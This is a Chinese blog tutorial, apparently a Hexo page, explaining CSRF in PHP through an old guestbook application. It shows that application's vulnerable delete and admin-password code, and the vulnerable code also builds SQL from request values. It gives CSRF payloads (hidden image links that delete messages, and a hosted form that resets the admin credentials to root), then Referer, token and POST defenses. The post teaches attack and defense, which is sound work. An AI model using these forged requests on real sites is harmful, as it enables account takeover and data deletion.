@@ -1,0 +1,678 @@
+
+ <!DOCTYPE HTML>
+<html lang="Chinese">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  
+    <title>PHP|PHP漏洞全解-跨网站请求伪造 | 只为不凡而来</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="wuduozhi">
+    
+
+    
+    <meta name="description" content="简介CSRF(Cross Site Request Forgeries)，意为跨网站请求伪造，也有写为XSRF。攻击者伪造目标用户的HTTP请求，然后此请求发送到有CSRF漏洞的网站，网站执行此请求后，引发跨站请求伪造攻击。攻击者利用隐蔽的HTTP连接，让目标用户在不注意的情况下单击这个链接，由于是用户自己点击的，而他又是合法用户拥有合法权限，所以目标用户能够在网站内执行特定的HTTP链接，从而达">
+<meta name="keywords" content="PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP|PHP漏洞全解-跨网站请求伪造">
+<meta property="og:url" content="http://yoursite.com/2018/03/25/PHP-PHP漏洞全解-跨网站请求伪造/index.html">
+<meta property="og:site_name" content="只为不凡而来">
+<meta property="og:description" content="简介CSRF(Cross Site Request Forgeries)，意为跨网站请求伪造，也有写为XSRF。攻击者伪造目标用户的HTTP请求，然后此请求发送到有CSRF漏洞的网站，网站执行此请求后，引发跨站请求伪造攻击。攻击者利用隐蔽的HTTP连接，让目标用户在不注意的情况下单击这个链接，由于是用户自己点击的，而他又是合法用户拥有合法权限，所以目标用户能够在网站内执行特定的HTTP链接，从而达">
+<meta property="og:locale" content="Chinese">
+<meta property="og:updated_time" content="2018-03-24T10:43:45.352Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP|PHP漏洞全解-跨网站请求伪造">
+<meta name="twitter:description" content="简介CSRF(Cross Site Request Forgeries)，意为跨网站请求伪造，也有写为XSRF。攻击者伪造目标用户的HTTP请求，然后此请求发送到有CSRF漏洞的网站，网站执行此请求后，引发跨站请求伪造攻击。攻击者利用隐蔽的HTTP连接，让目标用户在不注意的情况下单击这个链接，由于是用户自己点击的，而他又是合法用户拥有合法权限，所以目标用户能够在网站内执行特定的HTTP链接，从而达">
+
+    
+    <link rel="alternative" href="/atom.xml" title="只为不凡而来" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/unnamed4_n_mSY_icon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/profile.png">
+    <link rel="apple-touch-icon-precomposed" href="/img/profile.png">
+    
+    <link rel="stylesheet" href="/css/style.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+  <body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="只为不凡而来" title="只为不凡而来"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="只为不凡而来">只为不凡而来</a></h1>
+				<h2 class="blog-motto">小智的世界</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/03/25/PHP-PHP漏洞全解-跨网站请求伪造/" title="PHP|PHP漏洞全解-跨网站请求伪造" itemprop="url">PHP|PHP漏洞全解-跨网站请求伪造</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="wuduozhi" target="_blank" itemprop="author">wuduozhi</a>
+		
+  <p class="article-time">
+    <time datetime="2018-03-24T18:30:47.000Z" itemprop="datePublished"> Published 2018-03-25</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞案例"><span class="toc-number">2.</span> <span class="toc-text">漏洞案例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#任意删除留言"><span class="toc-number">2.1.</span> <span class="toc-text">任意删除留言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#修改管理员密码"><span class="toc-number">2.2.</span> <span class="toc-text">修改管理员密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防范方法"><span class="toc-number">3.</span> <span class="toc-text">防范方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#检查网页来源"><span class="toc-number">3.1.</span> <span class="toc-text">检查网页来源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#检查内置隐藏变量"><span class="toc-number">3.2.</span> <span class="toc-text">检查内置隐藏变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用POST，不要使用GET"><span class="toc-number">3.3.</span> <span class="toc-text">使用POST，不要使用GET</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>CSRF(Cross Site Request Forgeries)，意为跨网站请求伪造，也有写为XSRF。攻击者伪造目标用户的HTTP请求，然后此请求发送到有CSRF漏洞的网站，网站执行此请求后，引发跨站请求伪造攻击。攻击者利用隐蔽的HTTP连接，让目标用户在不注意的情况下单击这个链接，由于是用户自己点击的，而他又是合法用户拥有合法权限，所以目标用户能够在网站内执行特定的HTTP链接，从而达到攻击者的目的。</p>
+<h3 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><p>随缘网络PHP留言板V1.0</p>
+<h4 id="任意删除留言"><a href="#任意删除留言" class="headerlink" title="任意删除留言"></a>任意删除留言</h4><pre><code>include_once(&quot;dlyz.php&quot;); //dlyz.php用户验证权限，当权限是admin的时候方可删除留言 
+include_once(&quot;../conn.php&quot;); 
+$del=$_GET[&quot;del&quot;]; 
+$id=$_GET[&quot;id&quot;]; 
+if ($del==&quot;data&quot;) { 
+    $ID_Dele= implode(&quot;,&quot;,$_POST[&apos;adid&apos;]); 
+    $sql=&quot;delete from book where id in (&quot;.$ID_Dele.&quot;)&quot;; 
+    mysql_query($sql); 
+} 
+else { 
+    $sql=&quot;delete from book where id=&quot;.$id; //传递要删除的留言ID 
+    mysql_query($sql); 
+} 
+mysql_close($conn); 
+echo &quot;&quot;; 
+echo &quot;alert(‘删除成功！’);&quot;; 
+echo &quot; location=’book.php’;&quot;; 
+echo &quot;&quot;; 
+?&gt; 
+</code></pre><p>当我们具有admin权限，提交<a href="http://localhost/manage/delbook.php?id=2" target="_blank" rel="external">http://localhost/manage/delbook.php?id=2</a> 时，就会删除id为2的留言。</p>
+<p>利用方法:</p>
+<p>我们使用普通用户留言（源代码方式），内容为。</p>
+<pre><code>&quot;delbook.php?id=2&quot; /&gt; 
+&quot;delbook.php?id=3&quot; /&gt; 
+&quot;delbook.php?id=4&quot; /&gt; 
+&quot;delbook.php?id=5&quot; /&gt; 
+</code></pre><p>插入4张图片链接分别删除4个id留言，然后我们返回首页浏览看，没有什么变化。。(图片显示不了)</p>
+<p>现在我们再用管理员账号登陆后，来刷新首页，会发现留言就剩一条，其他在图片链接中指定的ID号的留言，全部都被删除。</p>
+<p>攻击者在留言中插入隐藏的图片链接，此链接具有删除留言的作用，而攻击者自己访问这些图片链接的时候，是不具有权限的，所以看不到任何效果，但是当管理员登陆后，查看此留言，就会执行隐藏的链接，而他的权限又是足够大的，从而这些留言就被删除了.</p>
+<h4 id="修改管理员密码"><a href="#修改管理员密码" class="headerlink" title="修改管理员密码"></a>修改管理员密码</h4><pre><code>//pass.php 
+if($_GET[&quot;act&quot;]) { 
+    $username=$_POST[&quot;username&quot;]; 
+    $sh=$_POST[&quot;sh&quot;]; 
+    $gg=$_POST[&quot;gg&quot;]; 
+    $title=$_POST[&quot;title&quot;]; 
+    $copyright=$_POST[&quot;copyright&quot;];
+    $password=md5($_POST[&quot;password&quot;]); 
+if(emptyempty($_POST[&quot;password&quot;])) { 
+    $sql=&quot;update gly set username=’&quot;.$username.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; 
+} 
+else { 
+    $sql=&quot;update gly set username=’&quot;.$username.&quot;’,password=’&quot;.$password.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; 
+} 
+mysql_query($sql); 
+mysql_close($conn); 
+echo &quot;&quot;; 
+echo &quot;alert(‘修改成功！’);&quot;; 
+echo &quot; location=’pass.php’;&quot;; 
+echo &quot;&quot;; 
+} 
+</code></pre><p>这个文件用于修改管理密码和网站设置的一些信息，我们可以直接构造如下表单:</p>
+<pre><code>&lt;body&gt; 
+    &lt;form action=&quot;http://localhost/manage/pass.php?act=xg&quot; method=&quot;post&quot; name=&quot;form1&quot; id=&quot;form1&quot;&gt; 
+    &lt;input type=&quot;radio&quot; value=&quot;1&quot; name=&quot;sh&quot;&gt; 
+    &lt;input type=&quot;radio&quot; name=&quot;sh&quot; checked value=&quot;0&quot;&gt; 
+    &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;root&quot;&gt; 
+    &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;root&quot;&gt; 
+    &lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;随缘网络PHP留言板V1.0(带审核功能)&quot; &gt; 
+    &lt;textarea name=&quot;gg&quot; rows=&quot;6&quot; cols=&quot;80&quot; &gt;欢迎您安装使用随缘网络PHP留言板V1.0(带审核功能)！textarea&gt; 
+    &lt;textarea name=&quot;copyright&quot; rows=&quot;6&quot; cols=&quot;80&quot; &gt;随缘网络PHP留言本V1.0 版权所有：厦门随缘网络科技 2005-2009&lt;br/&gt;承接网站建设及系统定制 提供优惠主机域名textarea&gt; 
+    form&gt; 
+&lt;body&gt; 
+</code></pre><p>存为attack.html，放到自己网站上<a href="http://www.wduozhi.xyz/attack.html，此页面访问后会自动向目标程序的pass.php提交参数，用户名修改为root，密码修改为root，然后我们去留言板发一条留言，隐藏这个链接，管理访问以后，他的用户名和密码全部修改成了root" target="_blank" rel="external">http://www.wduozhi.xyz/attack.html，此页面访问后会自动向目标程序的pass.php提交参数，用户名修改为root，密码修改为root，然后我们去留言板发一条留言，隐藏这个链接，管理访问以后，他的用户名和密码全部修改成了root</a></p>
+<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><p>防范CSRF要比防范其他攻击更加困难，因为CSRF的HTTP请求虽然是攻击者伪造的，但是却是由目标用户发出的，一般常见的防范方法有下面几种:</p>
+<ol>
+<li>检查网页的来源</li>
+<li>检查内置的隐藏变量</li>
+<li>使用POST，不要使用GET</li>
+</ol>
+<h4 id="检查网页来源"><a href="#检查网页来源" class="headerlink" title="检查网页来源"></a>检查网页来源</h4><p>在//pass.php头部加入以下红色字体代码，验证数据提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">if($_GET[&quot;act&quot;]) </div><div class="line">&#123; </div><div class="line">    if(isset($_SERVER[&quot;HTTP_REFERER&quot;])) </div><div class="line">    &#123; </div><div class="line">        $serverhost = $_SERVER[&quot;SERVER_NAME&quot;]; </div><div class="line">        $strurl = str_replace(&quot;http://&quot;,&quot;&quot;,$_SERVER[&quot;HTTP_REFERER&quot;]); </div><div class="line">        $strdomain = explode(&quot;/&quot;,$strurl); </div><div class="line">        $sourcehost = $strdomain[0]; </div><div class="line">    if(strncmp($sourcehost, $serverhost, strlen($serverhost))) </div><div class="line">    &#123;</div><div class="line">        unset($_POST); </div><div class="line">        echo &quot;&quot;; </div><div class="line">        echo &quot;alert(‘数据来源异常!’);&quot;; </div><div class="line">        echo &quot; location=’index.php’;&quot;;</div><div class="line">        echo &quot;&quot;; </div><div class="line">     &#125; </div><div class="line">     &#125; </div><div class="line">    $username=$_POST[&quot;username&quot;]; </div><div class="line">    $sh=$_POST[&quot;sh&quot;]; </div><div class="line">    $gg=$_POST[&quot;gg&quot;]; </div><div class="line">    $title=$_POST[&quot;title&quot;]; </div><div class="line">    $copyright=$_POST[&quot;copyright&quot;].&quot;</div><div class="line">设计制作：厦门随缘网络科技&quot;; </div><div class="line">    $password=md5($_POST[&quot;password&quot;]); </div><div class="line">    if(emptyempty($_POST[&quot;password&quot;])) </div><div class="line">    &#123; </div><div class="line">        $sql=&quot;update gly set username=’&quot;.$username.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; </div><div class="line">    &#125; </div><div class="line">    else </div><div class="line">    &#123; </div><div class="line">        $sql=&quot;update gly set username=’&quot;.$username.&quot;’,password=’&quot;.$password.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; </div><div class="line">    &#125; </div><div class="line">mysql_query($sql); </div><div class="line">mysql_close($conn); </div><div class="line">echo &quot;&quot;; </div><div class="line">echo &quot;alert(‘修改成功！’);&quot;; </div><div class="line">echo &quot; location=’pass.php’;&quot;; </div><div class="line">echo &quot;&quot;; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h4 id="检查内置隐藏变量"><a href="#检查内置隐藏变量" class="headerlink" title="检查内置隐藏变量"></a>检查内置隐藏变量</h4><p>我们在表单中内置一个隐藏变量和一个session变量，然后检查这个隐藏变量和session变量是否相等，以此来判断是否同一个网页所调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">include_once(&quot;dlyz.php&quot;); </div><div class="line">include_once(&quot;../conn.php&quot;); </div><div class="line">if($_GET[&quot;act&quot;]) </div><div class="line">&#123; </div><div class="line">    if (!isset($_SESSION[&quot;post_id&quot;])) </div><div class="line">    &#123; </div><div class="line">        // 生成唯一的ID，并使用MD5来加密 </div><div class="line">        $post_id = md5(uniqid(rand(), true)); </div><div class="line">        // 创建Session变量 </div><div class="line">        $_SESSION[&quot;post_id&quot;] = $post_id; </div><div class="line">    &#125; </div><div class="line">// 检查是否相等 </div><div class="line">if (isset($_SESSION[&quot;post_id&quot;])) </div><div class="line">&#123; </div><div class="line">    // 不相等 </div><div class="line">    if ($_SESSION[&quot;post_id&quot;] != $_POST[&quot;post_id&quot;]) </div><div class="line">    &#123; </div><div class="line">        // 清除POST变量 </div><div class="line">        unset($_POST); </div><div class="line">        echo &quot;&lt;script language=’javascript’&gt;&quot;; </div><div class="line">        echo &quot;alert(‘数据来源异常!’);&quot;; </div><div class="line">        echo &quot; location=’index.php’;&quot;; </div><div class="line">        echo &quot;script&gt;&quot;; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line">…… </div><div class="line">&lt;input type=&quot;reset&quot; name=&quot;Submit2&quot; value=&quot;重 置&quot;&gt; </div><div class="line">&lt;input type=&quot;hidden&quot; name=&quot;post_id&quot; value=&quot;php echo $_SESSION[&quot;post_id&quot;];?&gt;&quot;&gt; </div><div class="line"></div><div class="line">mysql_close($conn); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<h4 id="使用POST，不要使用GET"><a href="#使用POST，不要使用GET" class="headerlink" title="使用POST，不要使用GET"></a>使用POST，不要使用GET</h4><p>传递表单字段时，一定要是用POST，不要使用GET，处理变量也不要直接使用$_REQUEST</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/PHP/">PHP</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/PHP/">PHP</a>
+  </div>
+
+</div>
+
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2018/03/26/Web安全-一些有用的工具/" title="Web安全|一些有用的工具">
+  <span>
+  Web安全|一些有用的工具</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2018/03/24/PHP-PHP漏洞全解-跨站脚本攻击XSS/"  title="PHP|PHP漏洞全解-跨站脚本攻击XSS">
+ <span>PHP|PHP漏洞全解-跨站脚本攻击XSS
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+<div id="authorInfo">
+	
+		<div class="author-img"></div>		
+	
+	<div class="social-info" class="clearfix">
+		
+		
+		<a href="https://github.com/wuduozhi" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:1220555415@qq.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+
+	</div>
+</div>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/DataStruct/" title="DataStruct">DataStruct<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Java/" title="Java">Java<sup>19</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/PHP/" title="PHP">PHP<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/VHDL/" title="VHDL">VHDL<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Vim/" title="Vim">Vim<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Web安全/" title="Web安全">Web安全<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/colleage/" title="colleage">colleage<sup>4</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/college/" title="college">college<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/config/" title="config">config<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/life/" title="life">life<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/python/" title="python">python<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/工具/" title="工具">工具<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/machine/" title="机器学习">机器学习<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/爬虫/" title="爬虫">爬虫<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/计算机算法/" title="计算机算法">计算机算法<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/运维/" title="运维">运维<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/面试/" title="面试">面试<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>20</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP/" title="PHP">PHP<sup>11</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/数据结构/" title="数据结构">数据结构<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/life/" title="life">life<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/机器学习/" title="机器学习">机器学习<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/爬虫/" title="爬虫">爬虫<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/hexo/" title="hexo">hexo<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Mysql/" title="Mysql">Mysql<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Web/" title="Web">Web<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/markdowm/" title="markdowm">markdowm<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/大学/" title="大学">大学<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Jersey/" title="Jersey">Jersey<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/git/" title="git">git<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/工具/" title="工具">工具<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/动态规划/" title="动态规划">动态规划<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Web安全/" title="Web安全">Web安全<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/VHDL/" title="VHDL">VHDL<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/求职/" title="求职">求职<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/生活/" title="生活">生活<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+		
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/hsihohuang/kiddochan" target="_blank" title="Kiddochan">Kiddochan</a> © 2018 
+		
+		<a href="/about" target="_blank" title="wuduozhi">wuduozhi</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End --><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
